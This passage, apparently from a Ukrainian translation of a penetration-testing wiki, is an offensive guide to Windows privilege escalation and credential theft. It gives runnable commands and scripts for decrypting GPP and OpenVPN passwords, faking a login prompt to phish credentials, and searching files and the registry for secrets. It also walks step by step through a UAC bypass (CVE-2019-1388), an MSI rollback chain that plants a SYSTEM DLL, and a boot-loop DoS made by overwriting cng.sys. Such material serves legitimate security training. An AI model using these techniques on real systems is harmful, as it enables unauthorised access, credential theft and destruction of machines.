Для зменшення цього ризику було розроблено функцію пошуку локально кешованих GPP-файлів, що містять непорожнє поле "cpassword". Після знаходження такого файлу функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити та усунути цю вразливість безпеки.

Виконайте пошук у `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до W Vista)_ таких файлів:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Використання crackmapexec для отримання паролів:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Приклад web.config з обліковими даними:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Облікові дані OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Журнали
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Запит облікових даних

Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що безпосередньо **запитувати** клієнта про **облікові дані** дійсно **ризиковано**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Можливі імена файлів, що містять облікові дані**

Відомі файли, які раніше містили **паролі** у **відкритому тексті** або у форматі **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Знайдіть у всіх запропонованих файлах:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Облікові дані в RecycleBin

Також слід перевірити Корзину на наявність облікових даних у ній

Щоб **відновити паролі**, збережені різними програмами, можна використати: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Усередині реєстру

**Інші можливі ключі реєстру з обліковими даними**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Витягування ключів openssh із реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Слід перевірити dbs, де зберігаються паролі від **Chrome або Firefox**.\
Також перевірте історію, закладки та вибране браузерів, оскільки там можуть зберігатися **паролі**.

Інструменти для вилучення паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен COM-компонент **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а кожен компонент надає функціональність через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсів (IID).

COM-класи та інтерфейси визначені в реєстрі відповідно в **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей реєстр створюється шляхом об’єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Усередині CLSID цього реєстру можна знайти дочірній розділ реєстру **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення з назвою **ThreadingModel**, яке може мати значення **Apartment** (однопотоковий), **Free** (багатопотоковий), **Both** (одно- або багатопотоковий) або **Neutral** (нейтральний щодо потоків).

![Історія браузерів — COM DLL Overwriting: У CLSID цього реєстру можна знайти дочірній розділ реєстру InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)

Якщо ви можете **перезаписати будь-яку DLL**, яка буде виконана, то зможете **підвищити привілеї**, якщо цю DLL буде виконано від імені іншого користувача.

Щоб дізнатися, як атакувальники використовують COM Hijacking як механізм persistence, перегляньте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Пошук загальних паролів у файлах і реєстрі**

**Пошук вмісту файлів**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Пошук файлу з певним ім'ям**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Пошук назв ключів і паролів у реєстрі**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**, який я створив для **автоматичного виконання кожного metasploit POST-модуля, що шукає облікові дані** всередині жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять паролі, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для вилучення паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сесії**, **імена користувачів** і **паролі** для кількох інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Уявімо, що **процес, який працює від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) **із повним доступом**. Цей самий процес **також створює новий процес** (`CreateProcess()`) **із низькими привілеями, але успадковує всі відкриті handle основного процесу**.\
Якщо ви маєте **повний доступ до процесу з низькими привілеями**, то можете отримати **відкритий handle до привілейованого процесу, створений** за допомогою `OpenProcess()`, і **інжектувати shellcode**.\
[Ознайомтеся з цим прикладом, щоб дізнатися більше про **виявлення та експлуатацію цієї вразливості**.](leaked-handle-exploitation.md)\
[Ознайомтеся з цим **іншим дописом, де наведено повніше пояснення того, як тестувати та використовувати додаткові відкриті handle процесів і потоків, успадковані з різними рівнями дозволів (не лише з повним доступом)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Сегменти спільної пам'яті, які називають **pipe**, забезпечують взаємодію процесів і передавання даних.

Windows надає функцію під назвою **Named Pipes**, яка дає змогу непов'язаним процесам обмінюватися даними, навіть через різні мережі. Це нагадує клієнт-серверну архітектуру, де ролі визначаються як **named pipe server** і **named pipe client**.

Коли **client** надсилає дані через pipe, **server**, який налаштував pipe, може **прийняти ідентичність** **client**, якщо має необхідні права **SeImpersonate**. Виявлення **привілейованого процесу**, який взаємодіє через pipe, що його можна імітувати, створює можливість **отримати вищі привілеї**, прийнявши ідентичність цього процесу після його взаємодії зі створеним вами pipe. Інструкції з виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений нижче інструмент дає змогу **перехоплювати взаємодію через named pipe за допомогою інструмента на кшталт burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **а цей інструмент дає змогу перелічити та переглянути всі pipe для пошуку privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Служба Telephony (TapiSrv) у режимі server відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований client може використати асинхронний шлях подій на основі mailslot, щоб перетворити `ClientAttach` на довільний запис **4-byte** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, а потім отримати права адміністратора Telephony і завантажити довільну DLL як служба. Повний ланцюжок:

- `ClientAttach` із параметром `pszDomainUser`, установленим у наявний шлях, доступний для запису → служба відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для запису асинхронних подій.
- Кожна подія записує контрольований атакувальником `InitContext` із `Initialize` у цей handle. Зареєструйте line app за допомогою `LRegisterRequestRecipient` (`Req_Func 61`), запустіть `TRequestMakeCall` (`Req_Func 121`), отримайте дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасуйте реєстрацію/завершіть роботу, щоб повторювати детерміновані записи.
- Додайте себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, повторно підключіться, а потім викличте `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть виконувати щось у Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Клікабельні Markdown-посилання, передані до `ShellExecuteExW`, можуть запускати небезпечні URI handlers (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) та виконувати контрольовані атакувальником файли від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Під час отримання shell від імені користувача можуть виконуватися заплановані завдання або інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди збирає командні рядки процесів і порівнює поточний стан із попереднім, виводячи всі відмінності.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Викрадення паролів із процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо ви маєте доступ до графічного інтерфейсу (через консоль або RDP), а UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM", використовуючи непривілейованого користувача.

Це дає змогу одночасно підвищити привілеї та обійти UAC, використовуючи ту саму вразливість. Крім того, немає потреби щось встановлювати, а бінарний файл, що використовується під час цього процесу, підписаний і виданий Microsoft.

Деякі з уражених систем:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Для експлуатації цієї вразливості необхідно виконати такі кроки:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Від Administrator Medium до High Integrity Level / UAC Bypass

Прочитайте це, щоб **дізнатися про Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC і UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Від довільного видалення/переміщення/перейменування папки до SYSTEM EoP

Техніка, описана [**у цьому blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), з exploit code, [**доступним тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Атака переважно полягає у зловживанні функцією rollback у Windows Installer для заміни легітимних файлів на malicious під час процесу видалення. Для цього attacker повинен створити **malicious MSI installer**, який використовуватиметься для hijack папки `C:\Config.Msi`. Пізніше Windows Installer використовуватиме її для зберігання rollback-файлів під час видалення інших MSI-пакетів, де rollback-файли буде змінено так, щоб вони містили malicious payload.

Стисло техніка виглядає так:

1. **Stage 1 – Підготовка до Hijack (залишити `C:\Config.Msi` порожньою)**

- Step 1: Встановлення MSI
- Створіть `.msi`, який встановлює harmless-файл (наприклад, `dummy.txt`) у writable-папку (`TARGETDIR`).
- Позначте installer як **"UAC Compliant"**, щоб **non-admin user** міг його запустити.
- Залиште **handle** відкритим для файлу після встановлення.

- Step 2: Початок Uninstall
- Видаліть той самий `.msi`.
- Процес uninstall починає переміщувати файли до `C:\Config.Msi` і перейменовувати їх на файли `.rbf` (rollback backups).
- **Опитуйте відкритий file handle** за допомогою `GetFinalPathNameByHandle`, щоб виявити момент, коли файл стане `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` містить **custom uninstall action (`SyncOnRbfWritten`)**, яка:
- Сигналізує, коли `.rbf` було записано.
- Потім **очікує** на іншу подію перед продовженням uninstall.

- Step 4: Блокування видалення `.rbf`
- Після сигналу **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **перешкоджає його видаленню**.
- Потім **надішліть сигнал у відповідь**, щоб uninstall міг завершитися.
- Windows Installer не може видалити `.rbf`, і оскільки він не може видалити весь вміст, `C:\Config.Msi` **не видаляється**.

- Step 5: Ручне видалення `.rbf`
- Ви (attacker) вручну видаляєте файл `.rbf`.
- Тепер `C:\Config.Msi` порожня і готова до hijack.

> На цьому етапі **активуйте vulnerability довільного видалення папки на рівні SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Stage 2 – Заміна Rollback Scripts на Malicious**

- Step 6: Повторне створення `C:\Config.Msi` зі слабкими ACL
- Самостійно створіть папку `C:\Config.Msi` повторно.
- Встановіть **weak DACLs** (наприклад, Everyone:F) і **залиште handle відкритим** із `WRITE_DAC`.

- Step 7: Запуск іншого Install
- Встановіть `.msi` з такими параметрами:
- `TARGETDIR`: Writable location.
- `ERROROUT`: Змінна, яка спричиняє примусовий збій.
- Це встановлення використовуватиметься для повторного запуску **rollback**, який читає `.rbs` і `.rbf`.

- Step 8: Моніторинг `.rbs`
- Використовуйте `ReadDirectoryChangesW` для моніторингу `C:\Config.Msi`, доки не з’явиться новий `.rbs`.
- Збережіть його filename.

- Step 9: Sync перед Rollback
- `.msi` містить **custom install action (`SyncBeforeRollback`)**, яка:
- Сигналізує подію, коли створено `.rbs`.
- Потім **очікує** перед продовженням.

- Step 10: Повторне застосування Weak ACL
- Після отримання події `.rbs created`:
- Windows Installer **повторно застосовує strong ACLs** до `C:\Config.Msi`.
- Але оскільки у вас усе ще є handle із `WRITE_DAC`, ви можете **повторно застосувати weak ACLs**.

> **ACL застосовуються лише під час відкриття handle**, тому ви все ще можете записувати до папки.

- Step 11: Розміщення Fake `.rbs` і `.rbf`
- Перезапишіть файл `.rbs` на **fake rollback script**, який вказує Windows:
- Відновити ваш файл `.rbf` (malicious DLL) у **privileged location** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Розмістіть ваш fake `.rbf`, що містить **malicious SYSTEM-level payload DLL**.

- Step 12: Активація Rollback
- Надішліть сигнал sync event, щоб installer продовжив роботу.
- **type 19 custom action (`ErrorOut`)** налаштовано для **навмисного збою install** у відомій точці.
- Це запускає **rollback**.

- Step 13: SYSTEM встановлює вашу DLL
- Windows Installer:
- Читає вашу malicious `.rbs`.
- Копіює вашу DLL із `.rbf` у target location.
- Тепер у вас є **malicious DLL у SYSTEM-loaded path**.

- Final Step: Виконання SYSTEM Code
- Запустіть trusted **auto-elevated binary** (наприклад, `osk.exe`), який завантажує hijacked DLL.
- **Boom**: ваш code виконується **як SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлу до SYSTEM EoP

Основна MSI rollback technique (попередня) передбачає можливість видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що робити, якщо ваша vulnerability дозволяє лише **довільне видалення файлів**?

Ви можете використати **внутрішні механізми NTFS**: кожна папка має прихований alternate data stream під назвою:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Цей потік зберігає **метадані індексу** папки.

Отже, якщо ви **видалите потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить всю папку** з файлової системи.

Це можна зробити за допомогою стандартних API видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Навіть якщо ви викликаєте API видалення *file*, він **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
Що робити, якщо ваш primitive не дозволяє видаляти довільні files/folders, але **дозволяє видаляти *вміст* папки, контрольованої attacker**?

1. Крок 1: Налаштуйте bait folder і file
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- oplock **призупиняє виконання**, коли privileged process намагається видалити `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **oplock спрацьовує** та передає керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
- Це спорожнює `folder1`, не порушуючи oplock.
- Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Варіант C: Створити **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Це спрямовано на внутрішній потік NTFS, у якому зберігаються метадані папки — його видалення видаляє папку.

5. Крок 5: Вивільнення oplock
- Процес SYSTEM продовжує роботу та намагається видалити `file1.txt`.
- Але тепер через junction + symlink він фактично видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Результат**: `C:\Config.Msi` видаляється SYSTEM.

### Від створення довільної папки до постійного DoS

Використайте primitive, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі permissions**.

Створіть **папку** (не файл) з іменем **критичного драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```
- Цей шлях зазвичай відповідає kernel-mode driver `cng.sys`.
- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити фактичний driver під час boot.
- Потім Windows намагається завантажити `cng.sys` під час boot.
- Вона бачить папку, **не може визначити фактичний driver** і **аварійно завершує роботу або зупиняє boot**.
- **Fallback відсутній**, як і **відновлення** без зовнішнього втручання (наприклад, boot repair або доступу до диска).

### Від привілейованих шляхів журналів/резервних копій + OM symlinks до довільного перезапису файлів / boot DoS

Коли **привілейований service** записує журнали/експорти за шляхом, прочитаним із **конфігурації, доступної для запису**, перенаправте цей шлях за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити привілейований запис на довільний перезапис (навіть **без** SeCreateSymbolicLinkPrivilege).

**Вимоги**
- Конфігурація, у якій зберігається цільовий шлях, доступна зловмиснику для запису (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити mount point до `\RPC Control` і файловий OM symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Привілейована операція, яка записує за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитати конфігурацію, щоб отримати призначення привілейованого журналу, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправити шлях без admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише log (наприклад, адміністратор запускає «надіслати тестове SMS»). Тепер запис потрапляє до `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписану ціль (за допомогою hex/PE parser), щоб підтвердити пошкодження; перезавантаження змушує Windows завантажити змінений шлях до driver → **boot loop DoS**. Це також узагальнюється на будь-який захищений файл, який привілейований service відкриє для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія існує в `C:\Windows\System32\cng.sys`, спочатку може бути здійснена спроба завантажити саме її, що робить цей файл надійним приймачем пошкоджених даних для DoS.



## **Від High Integrity до System**

### **Новий service**

Якщо ви вже працюєте в процесі з High Integrity, **шлях до SYSTEM** може бути простим: достатньо **створити та запустити новий service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Під час створення service binary переконайтеся, що це valid service або що binary виконує необхідні дії достатньо швидко, оскільки його буде завершено через 20 секунд, якщо це не valid service.

### AlwaysInstallElevated

Із процесу з High Integrity можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** та **встановити** reverse shell за допомогою _**.msi**_ wrapper.\
[Більше інформації про задіяні registry keys і встановлення пакета _.msi_ тут.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Якщо у вас є ці token privileges (імовірно, ви знайдете їх у вже запущеному процесі з High Integrity), ви зможете **відкрити майже будь-який процес** (крім protected processes) із привілеєм SeDebug, **скопіювати token** процесу та створити **довільний процес із цим token**.\
Зазвичай у цій техніці **обирають будь-який процес, запущений від імені SYSTEM, з усіма token privileges** (_так, можна знайти процеси SYSTEM без усіх token privileges_).\
**Приклад коду, що виконує запропоновану техніку, можна** [**знайти тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ця техніка використовується meterpreter для escalation у `getsystem`. Техніка полягає у **створенні pipe, а потім створенні або використанні service для запису в цей pipe**. Після цього **server**, який створив pipe за допомогою привілею **`SeImpersonate`**, зможе **імперсонувати token** клієнта pipe (service), отримавши привілеї SYSTEM.\
Якщо ви хочете [**дізнатися більше про named pipes, прочитайте це**](#named-pipe-client-impersonation).\
Якщо ви хочете прочитати приклад [**переходу від high integrity до System за допомогою named pipes, прочитайте це**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **здійснити hijack dll**, яку **завантажує** **процес**, запущений від імені **SYSTEM**, ви зможете виконати довільний код із цими правами. Тому Dll Hijacking також корисний для такого виду privilege escalation і, крім того, його **набагато легше виконати з процесу з high integrity**, оскільки він матиме **права на запис** у папки, які використовуються для завантаження dll.\
**Більше про Dll hijacking можна** [**дізнатися тут**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Найкращий tool для пошуку векторів локального privilege escalation у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє misconfigurations і sensitive files (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявлено.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє деякі можливі misconfigurations і збирає інформацію (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережену інформацію про сесії PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує credentials із Credential Manager. Виявлено.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Виконує spray зібраних паролів у домені**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh є PowerShell ADIDNS/LLMNR/mDNS spoofer та man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове Windows enumeration для privesc**\
